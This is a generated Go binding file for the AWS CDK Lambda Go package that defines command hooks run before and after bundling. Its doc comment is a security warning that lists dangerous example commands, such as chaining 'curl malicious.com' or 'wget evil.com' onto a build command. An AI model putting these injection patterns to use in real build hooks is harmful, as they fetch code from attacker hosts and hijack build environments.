package awscdklambdagoalpha

import (
	_jsii_ "github.com/aws/jsii-runtime-go/runtime"
)

// Command hooks.
//
// These commands will run in the environment in which bundling occurs: inside
// the container for Docker bundling or on the host OS for local bundling.
//
// ⚠️ **Security Warning**: Commands are executed directly in the shell environment.
// Only use trusted commands and avoid shell metacharacters that could enable
// command injection attacks.
//
// **Safe patterns (cross-platform):**
// - `go test ./...` - Standard Go commands work on all platforms
// - `go mod tidy` - Go module commands
// - `echo "Building"` - Simple output with quotes
// - `make clean` - Build tools (if available)
//
// **Dangerous patterns to avoid:**
//
// *Windows:*
// - `go test & curl.exe malicious.com` (command chaining)
// - `echo %USERPROFILE%` (environment variable expansion)
// - `powershell -Command "..."` (PowerShell execution)
//
// *Unix/Linux/macOS:*
// - `go test; curl malicious.com` (command chaining)
// - `echo $(whoami)` (command substitution)
// - `bash -c "wget evil.com"` (shell execution)
//
// Commands are chained with `&&`.
// See: https://docs.aws.amazon.com/cdk/latest/guide/security.html
//
// Experimental.
type ICommandHooks interface {
	// Returns commands to run after bundling.
	//
	// ⚠️ **Security Warning**: Ensure commands come from trusted sources only.
	// Commands are executed directly in the shell environment.
	//
	// Commands are chained with `&&`.
	// Experimental.
	AfterBundling(inputDir *string, outputDir *string) *[]*string
	// Returns commands to run before bundling.
	//
	// ⚠️ **Security Warning**: Ensure commands come from trusted sources only.
	// Commands are executed directly in the shell environment.
	//
	// Commands are chained with `&&`.
	// Experimental.
	BeforeBundling(inputDir *string, outputDir *string) *[]*string
}

// The jsii proxy for ICommandHooks
type jsiiProxy_ICommandHooks struct {
	_ byte // padding
}

func (i *jsiiProxy_ICommandHooks) AfterBundling(inputDir *string, outputDir *string) *[]*string {
	if err := i.validateAfterBundlingParameters(inputDir, outputDir); err != nil {
		panic(err)
	}
	var returns *[]*string

	_jsii_.Invoke(
		i,
		"afterBundling",
		[]interface{}{inputDir, outputDir},
		&returns,
	)

	return returns
}

func (i *jsiiProxy_ICommandHooks) BeforeBundling(inputDir *string, outputDir *string) *[]*string {
	if err := i.validateBeforeBundlingParameters(inputDir, outputDir); err != nil {
		panic(err)
	}
	var returns *[]*string

	_jsii_.Invoke(
		i,
		"beforeBundling",
		[]interface{}{inputDir, outputDir},
		&returns,
	)

	return returns
}

